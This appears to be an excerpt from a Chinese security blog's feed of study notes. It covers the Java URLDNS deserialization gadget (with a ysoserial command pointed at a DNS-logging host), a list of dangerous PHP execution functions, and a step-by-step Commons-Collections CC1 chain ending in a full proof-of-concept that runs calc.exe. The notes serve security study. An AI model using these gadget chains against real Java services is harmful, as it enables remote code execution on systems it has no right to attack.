(K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过注释</p>
<ul>
<li>  As part of deserialization, HashMap calls hashCode on each key that it</li>
<li>  deserializes, so using a Java URL object as a serialized key .</li>
</ul>
<p>我们找到最后的<code> putVal(hash(key), key, value, false, false);</code>关键就在<code>hash(key)</code>中。 </p>
<p>hash调用了hash对象只带的<code>hashcode()</code>方法  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305154457.png">  </p>
<p>传入的key是<code>URL</code>类，继续找到<code>URL</code>类的<code>hashcode()</code>。如果<code>URL.hashCode!=-1</code>继续调用<code>handler.hashCode()</code><br>  <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305154706.png"><br>  转到<code>handler</code>的定义，<code>handler</code>是<code>URLStreamHandler</code>类 ，继续找到<code>URLStreamHandler</code>的<code>hashCode</code>。发现有一个<code>getHostAddress</code><br>  <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305154806.png"><br>  <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305154922.png"> </p>
<p>  在<code>getHostAddress</code>中有<code>u.hostAddress = InetAddress.getByName(host)</code>方法。通过这个方法发送DNS解析。</p>
<p>我们使用命令生成序列化文件 <code>java -jar ysoserial-master-8eb5cbfbf6-1.jar URLDNS http://www.xyz.h2t5ky.ceye.io &gt; 123.txt</code></p>
<p>然后反序列化改文件，我们在DNS平台可以发现有最新的DNS解析记录  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305160510.png">  </p>
<p>整个<code>URLDNS</code>利用链如下</p>
<ol>
<li>HashMap-&gt;readObject()</li>
<li>HashMap-&gt;hash(URL)</li>
<li>URL-&gt;hashCode()</li>
<li>URLStreamHandler-&gt;hashCode()</li>
<li>URLStreamHandler-&gt;getHostAddress()</li>
<li>InetAddress-&gt;getByName()</li>
</ol>
<p>要构这个Gadget，初始化一个<code>URL</code>对象，作为<code>key</code>放在<code>HashMap</code>中，然后设置<code>URL.hashCOde</code>为-1，反序列化时就重新计算<code>hashCode</code>进行DNS请求。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>URLDNS</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码/命令执行函数</title>
    <url>/2022/03/05/PHP%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="PHP-命令执行危险函数"><a href="#PHP-命令执行危险函数" class="headerlink" title="PHP 命令执行危险函数"></a>PHP 命令执行危险函数</h1><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a></p>
<h3 id="PHP-代码执行的危险函数"><a href="#PHP-代码执行的危险函数" class="headerlink" title="PHP 代码执行的危险函数"></a>PHP 代码执行的危险函数</h3><p>eval()<br>传入命令需要以分号结尾</p>
<span id="more"></span>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305200420.png">  </p>
<p>assert()<br>传入命令不需要分号结尾<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305200551.png"></p>
<p>preg_replace()</p>
<p>create_function()<br>需要加分号<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305201336.png"></p>
<p>array_map()<br>array_map(func , arg)<br>func传入函数， arg传入参数数组<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305201714.png"></p>
<p>call_user_func()<br>传入参数作为assert函数参数<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305202012.png"></p>
<p>call_user_func_array()<br>传入参数作为数组第一个值给assert函数<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305202154.png"></p>
<p>array_filter()<br>用回调函数过滤数组中元素:array_filter(数组， 函数)<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305203600.png"></p>
<p>uasort()<br>php环境&gt;=&lt;5.6可以使用</p>
<h3 id="PHP-命令执行函数"><a href="#PHP-命令执行函数" class="headerlink" title="PHP 命令执行函数"></a>PHP 命令执行函数</h3><p>system();<br>可以直接显示结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305204035.png"></p>
<p>passthru();<br>可以直接显示结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305204106.png"></p>
<p>shell_exec();<br>函数可执行，但是要加echo 回显<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305204223.png"></p>
<p> exec<br>(可以执行命令，以数组形式的保存结果，命令执行的状态码)<br>但需要加echo才能显示结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305204439.png"></p>
<p>popen<br>//popen函数：打开一个指向进程的管道，该进程由派生指定的 command 命令执行而产生。<br>//返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）<br>//此指针可以用于 fgets()，fgetss() 和 fwrite()。并且必须用 pclose() 来关闭。<br>//若出错，则返回 false。</p>
<p>proc_open<br>//proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。</p>
<p>``反斜杠<br>本质上是 shell_exec函数,如果shell_exec禁用，该函数同样不能使用</p>
<p>ob_start<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305205240.png"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>REC</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-反序列化篇-CC1</title>
    <url>/2022/03/07/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC1/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-反序列化篇-CC1"><a href="#java漫谈笔记-反序列化篇-CC1" class="headerlink" title="java漫谈笔记-反序列化篇-CC1"></a>java漫谈笔记-反序列化篇-CC1</h1><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<h2 id="cc1-链"><a href="#cc1-链" class="headerlink" title="cc1 链"></a>cc1 链</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>JAVA <code>1.8.0_66</code><br>commons-collections-3.1</p>
<span id="more"></span>


<h3 id="CC1链简化demo"><a href="#CC1链简化demo" class="headerlink" title="CC1链简化demo"></a>CC1链简化demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">CC1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]</span><br><span class="line">            &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer是一个接口，含有transform()方法。</p>
<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>一个实现Transformer接口的类。构建函数就是将传入对象赋值给<code>iConstant</code>.<br>实现的Transformer方法为返回<code>iConstant</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>ConstantTranformer</code>主要作用就是包装一个对象，然后在<code>transform</code>中返回该对象。</p>
<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>该类主要用于执行方法</p>
<p>构造函数传入<code>方法名</code> <code>方法使用参数类型列表</code>  <code>方法使用参数列表</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实现的transform接口用来执行传入<code>input</code>对象的<code>iMethodName</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一步 :<br>在cc1链中首先创建了一个<code>Transformer</code>数组。<br>第一个值为类型为<code>ConstantTransformer</code>值为<code>Runtime</code>的Class对象。<br>第二个值类型为<code>InvokerTransformer</code>用于执行exec方法</p>
<h3 id="transformerChain"><a href="#transformerChain" class="headerlink" title="transformerChain"></a>transformerChain</h3><p>是一个实现tranform接口的类。主要作用是将传入的<code>Transformer</code>数组连接在一起。将前一个<code>Transformer.transform</code>的返回值作为后一个的参数传入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二步:<br>我们将之前的<code>Transformer</code>数组作为 <code>ChainedTransformer</code>构造函数的参数，得到一个可以使用的<code>chainedTransformer</code>对象。</p>
<p>我们现在有了可以使用的<code>chainedTransformer</code>对象，但是需要一个行为来触发它的<code>transform</code>方法.</p>
<h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>该类的<code>decorate</code>方法，返回一个Map。同时赋值传入的<code>KeyTransformer</code> <code>valueTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>第三步；我们获得一个Map，将前面的<code>chainedTransformer</code>作为<code>valueTransformer</code></p>
<p>Transformer.put</p>
<p>使用<code>keyTransformer</code> 和 <code>valueTransform</code>的tansfomr方法</p>
<p>第四步:<br>我们往Map中随便PUT一个东西，触发<code>chainedTranformer</code>的<code>transform</code>方法。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>我们之前的代码关键在于使用<code>outMap.put(&quot;sf&quot;, &quot;xxx&quot;)</code>来调用<code>transform</code>函数。我们同样需要一个类，它在反序列化的<code>readObject</code>中有类似的操作。这个类为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>.<br>查看它的<code>readObject</code>方法。我的8u66版本readObjec方法中间变量都是使用var1, var2 ,var3 …不好阅读。下面是<code>Java安全漫谈</code>原文中的代码便于阅读，与8u66的逻辑应该是一样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type</span></span><br><span class="line"><span class="string">                in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue :</span><br><span class="line">            memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123; <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                    value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                                value.getClass() + <span class="string">&quot;[&quot;</span> + value +</span><br><span class="line">                                        <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>关键在于 memberValue.setValue()使用了transform方法</p>
<p>所以需要创建一个AnnotationInvocationHandler并且设置我们之前的HashMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor = clazz.getConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj = constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">System.out.println(barr);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="使用反射"><a href="#使用反射" class="headerlink" title="使用反射"></a>使用反射</h4><p>尝试运行后发生错误<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220307172607.png"></p>
<p>Runtime.class无法无法序列化，在反序列化的过程中序列化对象和使用的内部属性都必须实现<code>java.io.Serializable</code>接口。我们最开始的<code>Runtime.getRuntime()</code>,Runtime类没有序列化接口。</p>
<p>所以我们使用反射使用getRuntime()方法。不需要直接使用Runtime类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method f= Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Runtime r = (Runtime) f.invoke(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p>转为Transformer为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class , Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class , Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> Object[]</span><br><span class="line">    &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们使用的是<code>Runtime.class</code>它是<code>java.lang.class</code>对象是实现了Serializable接口。继续运行程序。但是输出了反序列化后的数据，也成功序列化但是没有弹出计算器。<br>调试后发现<code>var7</code>为null。无法进入后面的setValue方法.</p>
<p>如果要var7不为null需要满足两个条件:</p>
<ol>
<li><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 构造函数的第⼀个参数必须是<br>Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设⽅法名是X</li>
<li>被 <code>TransformedMap.decorate</code> 修饰的Map中必须有⼀个键名为X的元素</li>
</ol>
<p>所以我们使用<code>Retention.class</code>作为<code>AnnotationInvocationHandler</code>的构造函数。<br>它有一个方法为<code>value</code><br>我们往Map中设置key = “value”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span> ,<span class="string">&quot;xxxxjl&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">transformerChain);</span><br><span class="line"></span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj = constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再次运行代码成功弹出计算器<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220307180151.png"></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220307181052.png"></p>
<p>在<code>AnnotationInvocationHandler</code>中<br>AnnotationInvocationHandler-&gt;setValue<br>setValue-&gt;checkSetValue<br>check-setValue-&gt;transform</p>
<p>如果我们使用版本大于<code>8u71</code>java运行代码，无法弹出计算器。</p>
<p>大于<code>8u71</code>的版本使用新建的<code>LinkHashMap</code>添加元素，不使用我们构造的Map无法弹出计算器。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220307180524.png"></p>
<p>完整POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">CC1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class , Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class , Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]</span><br><span class="line">            &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span> ,<span class="string">&quot;xxxxjl&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC1</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-反序列化篇-CC1-lazyMap</title>
    <url>/2022/03/08/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC1-lazyMap/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-反序列化篇-CC1-lazyMap"><a href="#java漫谈笔记-反序列化篇-CC1-lazyMap" class="headerlink" title="java漫谈笔记-反序列化篇-CC1-lazyMap"></a>java漫谈笔记-反序列化篇-CC1-lazyMap</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<h2 id="ysoserial中的cc1"><a href="#ysoserial中的cc1" class="headerlink" title="ysoserial中的cc1"></a>ysoserial中的cc1</h2><p>ysoserial中源代码使用的Map为<code>LazpMap</code>不是<code>TransformedMap</code>。通过<code>get</code>方法触发</p>
<span id="more"></span>transform方法。
